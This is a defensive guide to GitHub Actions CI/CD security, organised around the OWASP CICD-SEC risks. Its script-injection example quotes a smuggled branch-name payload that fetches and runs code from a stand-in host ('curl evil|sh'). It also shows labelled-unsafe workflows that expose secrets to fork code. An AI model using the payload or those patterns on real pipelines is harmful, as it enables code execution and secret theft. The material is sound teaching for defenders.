# CI/CD Workflow Security — GitHub Actions and friends

Source: OWASP Top 10 CI/CD Security Risks (CICD-SEC); GitHub, "Security hardening for GitHub Actions". Examples use GitHub Actions syntax; the trust rules map directly to GitLab CI, Buildkite, and Jenkins.

The pipeline trust model in one line: **anything a forker, issue-filer, or commit author can influence is attacker input — and the workflow runs it next to your secrets.**

## Contents

- Script injection via expression interpolation
- pull_request_target and poisoned pipeline execution
- Token permissions
- Pinning third-party actions
- Secrets hygiene in pipelines
- Artifacts, caches, and cross-workflow trust
- Self-hosted runners

## Script injection via expression interpolation

`${{ }}` expressions are substituted into the script *before* the shell parses it — attacker-controlled context becomes shell code. Attacker-controlled: PR/issue titles and bodies, branch names, commit messages, author names/emails, review comments.

```yaml
# Unsafe — branch name "x";curl evil|sh;" executes
run: echo "Building ${{ github.head_ref }}"
# Safe — env indirection: the value arrives as data, quoted by the shell
env:
  BRANCH: ${{ github.head_ref }}
run: echo "Building $BRANCH"
```

The same applies to `github-script` and to composing arguments for CLI tools. (CICD-SEC-4)

## pull_request_target and poisoned pipeline execution

`pull_request` from a fork runs without secrets — safe by design. `pull_request_target` and `workflow_run` run **with** secrets and a write token; combining them with the PR's code is the classic repo takeover:

```yaml
# Unsafe — fork code runs with your secrets
on: pull_request_target
steps:
  - uses: actions/checkout@...
    with: { ref: ${{ github.event.pull_request.head.sha }} }   # fork's code
  - run: npm install && npm test                               # executes it
```

`npm install` alone executes the fork's lifecycle scripts. Safe patterns: use plain `pull_request` for anything that builds or tests PR code; if a privileged step must react to PRs (labeling, commenting), keep it in a workflow that **never checks out or executes** untrusted code. (CICD-SEC-4 — Poisoned Pipeline Execution)

## Token permissions

The default `GITHUB_TOKEN` can be repo-wide write. Declare the minimum per workflow or job:

```yaml
# Unsafe
permissions: write-all          # or no permissions block on a permissive org default
# Safe
permissions:
  contents: read                # add only what this job provably needs
```

A leaked read-only token is an information leak; a leaked write token is a supply-chain incident. (CICD-SEC-2)

## Pinning third-party actions

A tag is mutable: whoever controls (or compromises) the action repo controls what `@v4` means tomorrow — and it runs inside your workflow with your token.

```yaml
# Unsafe
- uses: someorg/do-thing@v2
- uses: someorg/do-thing@main
# Safe — full commit SHA, version in a comment for humans/dependabot
- uses: someorg/do-thing@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0   # v2.1.3
```

Prefer official and verified-publisher actions; review the source of small unknown ones — an action is an arbitrary-code dependency. A hallucinated action name is squattable exactly like a package name. (CICD-SEC-3)

## Secrets hygiene in pipelines

- Masking is best-effort: `echo ${{ secrets.X }} | base64` defeats it. Never print, transform, or write secrets to files that get uploaded.
- Secrets in `if:` conditions, artifact contents, or build args leak through logs and downloads.
- Scope secrets with environments + required reviewers for deploy jobs; rotate anything that ever appeared in a log.
- Prefer **OIDC federation** to long-lived cloud keys stored as secrets: short-lived, scoped, nothing to steal at rest. (CICD-SEC-6)

## Artifacts, caches, and cross-workflow trust

- An artifact produced by a fork-triggered run is attacker output. A privileged `workflow_run` consumer that downloads and executes/parses it re-opens the PPE hole — validate what it is before trusting it. (CICD-SEC-9)
- Caches are write-shared per key scope: code restored from a cache writable by untrusted runs is untrusted. Don't cache-and-execute across trust boundaries.

## Self-hosted runners

A fork PR that reaches a self-hosted runner is arbitrary code on your machine — persistent, inside your network. Public repos use hosted runners for fork-triggerable workflows; self-hosted runners are reserved for trusted-trigger workflows, run ephemeral/isolated, and never reused across trust levels. (CICD-SEC-5)
